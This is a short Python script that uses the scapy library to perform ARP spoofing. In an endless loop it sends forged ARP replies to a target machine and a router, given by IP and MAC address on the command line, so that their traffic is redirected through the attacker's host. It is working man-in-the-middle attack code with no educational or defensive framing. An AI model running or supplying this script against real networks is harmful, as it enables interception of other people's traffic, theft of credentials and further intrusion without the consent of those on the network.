import scapy.all as scapy
import sys,time
from termcolor import cprint
import os,re,subprocess

def spoof(ip1,ip2,mac1,mac2):
    packet1 = scapy.ARP(op=2 , hwdst=mac1 ,pdst=ip1,psrc=ip2)
    packet2 = scapy.ARP(op=2 , hwdst=mac2 ,pdst=ip2,psrc=ip1)
    scapy.send(packet1 , verbose=False)
    scapy.send(packet2 , verbose=False)

def main():
    router_ip = sys.argv[1]
    router_mac = sys.argv[2]
    target_ip = sys.argv[3]
    target_mac = sys.argv[4]
    try:
        cprint('[+] Spoofing Router started ....','yellow')
        while True:
            spoof(target_ip,router_ip,target_mac,router_mac)
            cprint(' Sending 1 Fake Router Packet ','green')
            time.sleep(2)
    except KeyboardInterrupt:
        cprint('\n[-] Closing Router Spoofer ...','red')
        exit(0)

if __name__ == "__main__":
    main()